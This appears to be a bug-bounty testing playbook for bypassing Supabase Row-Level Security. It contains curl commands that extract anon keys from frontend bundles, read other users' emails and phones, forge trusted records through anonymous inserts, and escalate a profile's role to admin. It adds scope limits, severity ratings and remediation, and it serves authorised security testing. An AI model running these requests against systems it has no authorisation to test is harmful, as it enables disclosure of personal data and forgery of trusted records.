# Moraa — Supabase / PostgREST BaaS (Row-Level Security bypass)

> Load when the frontend talks to `*.supabase.co`, ships an `eyJ...` anon key, or you see
> `/rest/v1/`, `/auth/v1/`, `/storage/v1/` requests. Supabase exposes Postgres directly to the
> browser via PostgREST — **Row-Level Security (RLS) is the entire access-control layer**. No
> RLS policy, or a permissive one, is the bug.

> Treat the database as production: read ONE marker row to prove disclosure, write ONE
> clearly-labelled marker row to prove write, then delete it. The PoC is "I read/wrote one row I
> shouldn't", never "I exfiltrated the customer base."

## 0. Get the project URL + anon key from the frontend

Both ship in the client bundle by design — you need them before you can call the API.

```bash
curl -ksS "https://TARGET/" -o /tmp/sb_index.html
grep -oE 'src="[^"]+\.js"' /tmp/sb_index.html | sed 's/src="//;s/"//' > /tmp/sb_js.txt
# fetch each bundle, then:
grep -roE 'https://[a-z0-9]{20}\.supabase\.co' /tmp/sb_bundles/ | sort -u          # project ref
grep -roE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' /tmp/sb_bundles/ | sort -u  # JWT keys
```
Also check `.env`/`.env.local` left on the host, `*.js.map` source maps, `config.js`,
`window.__SUPABASE__` / `__NEXT_DATA__` blobs — see `js-analysis.md`.

**Decode every JWT — this is the single most important triage step:**
```bash
echo "<jwt-payload-b64url>" | tr '_-' '/+' | base64 -d 2>/dev/null | jq .
```
- `"role":"anon"` → normal public key, expected to be public. **Not a finding by itself** — the
  finding is what it can *do* through RLS.
- `"role":"service_role"` → **Critical on its own.** Bypasses RLS entirely. If it shipped
  anywhere client-reachable, that's full DB read/write — report immediately, no RLS hole needed.

```bash
SB="https://<ref>.supabase.co"; KEY="eyJ...<anon key>..."
```

## 1. Map the database (schema disclosure with zero rows read)

```bash
curl -ksS "$SB/rest/v1/" -H "apikey: $KEY" | jq '.definitions | keys'      # every table anon can see
curl -ksS "$SB/rest/v1/" -H "apikey: $KEY" | jq '.paths | keys'
```
Names that imply trust worth prioritizing: `certificates`, `verifications`, `licenses`,
`entitlements`, `subscriptions`, `kyc`, `documents`, `invites`, `roles`, `admins`.

## 2. RLS READ disclosure

```bash
curl -ksS "$SB/rest/v1/<table>?select=*&limit=1" -H "apikey: $KEY" -H "Authorization: Bearer $KEY"
```

| Response | Meaning |
|---|---|
| `200` + rows | Readable by anon — PII/secrets/other-tenant data here = disclosure finding |
| `200` + `[]` | RLS filtering you out, or table empty — add a known id to disambiguate |
| `403` `42501` "permission denied" | RLS is blocking — protected, move on |
| `401` | missing/bad `apikey` header |

```bash
# cross-tenant proof: read a row you do NOT own
curl -ksS "$SB/rest/v1/profiles?select=id,email,phone&user_id=eq.<someone-elses-uuid>" \
  -H "apikey: $KEY" -H "Authorization: Bearer $KEY"
# quantify scale without dumping: Content-Range header on a HEAD + Prefer: count=exact
curl -ksS "$SB/rest/v1/<table>?select=count" -H "apikey: $KEY" -H "Authorization: Bearer $KEY" \
  -H "Prefer: count=exact" -I
```

## 3. RLS WRITE abuse — the high-severity case: anonymous record forgery

A missing/permissive `INSERT` policy lets `anon` create rows the app later trusts as genuine — a
`certificates`/`verifications`/`licenses`/`badges` table with `INSERT` policy `true` (or no RLS
at all) is the canonical bounty pattern.

```bash
curl -ksS -X POST "$SB/rest/v1/<table>" -H "apikey: $KEY" -H "Authorization: Bearer $KEY" \
  -H "Content-Type: application/json" -H "Prefer: return=representation" \
  -d '{"<col>":"PENTEST-MARKER-do-not-trust"}'
```

| Response | Meaning |
|---|---|
| `201` + echoed row | **Anonymous write confirmed** — forgery possible |
| `400` "null value ... not-null" / "column does not exist" | write IS allowed, add the missing columns and retry |
| `403` `42501` "new row violates row-level security policy" | `WITH CHECK` blocking — protected |

**Prove the impact end-to-end**: forge a believable trusted record, then load the app's own
public verification/consumer route and confirm it now reports your forged row as genuine. That
last step — the app trusting your write — is what turns a raw INSERT into real impact.

```bash
# privilege-escalation variant: PATCH a trust column on YOUR OWN row only
curl -ksS -X PATCH "$SB/rest/v1/profiles?id=eq.<your-id>" -H "apikey: $KEY" \
  -H "Authorization: Bearer $KEY" -H "Content-Type: application/json" \
  -H "Prefer: return=representation" -d '{"role":"admin"}'
# clean up every marker/forged row you created
curl -ksS -X DELETE "$SB/rest/v1/<table>?id=eq.<your-marker-id>" -H "apikey: $KEY" -H "Authorization: Bearer $KEY"
```
Only `PATCH`/`DELETE` rows you created or your own account — never mutate real users' data.

## 4. Adjacent surfaces

- **RPC / `SECURITY DEFINER` functions** — `POST $SB/rest/v1/rpc/<fn>` with `{}`; definer
  functions run elevated and often skip RLS entirely. Enumerate from the OpenAPI `paths`.
- **Open signup → `authenticated` role** — `POST $SB/auth/v1/signup {"email","password"}` with a
  throwaway address; policies often grant `authenticated` far more than `anon`.
- **Storage** — `GET $SB/storage/v1/object/list/<bucket>` (with key) and public objects at
  `$SB/storage/v1/object/public/<bucket>/<path>` — public buckets full of private files are common.

## 5. Severity (Bugcrowd VRT-style)

| Finding | Verdict |
|---|---|
| `service_role` key reachable by a client | P1/Critical — full DB read+write |
| Anonymous write/forgery of a trusted record, or `UPDATE` of a role/trust column | P1-P2 |
| Anonymous read of other users' PII/secrets/tokens | P2-P3 (scale + sensitivity) |
| Schema disclosure only, no readable rows | P4/Informational |

Before writing the finding: the exact request/response with `apikey` redacted, for writes the
echoed `id` + proof the app trusts it + confirmation you deleted it, one concrete impact
sentence. **Remediation**: `ALTER TABLE ... ENABLE ROW LEVEL SECURITY;` on every exposed table,
explicit `USING`/`WITH CHECK` scoped to `auth.uid()`, never `INSERT`/`UPDATE` grants to `anon`,
`service_role` server-side only, lock down `SECURITY DEFINER` RPCs.
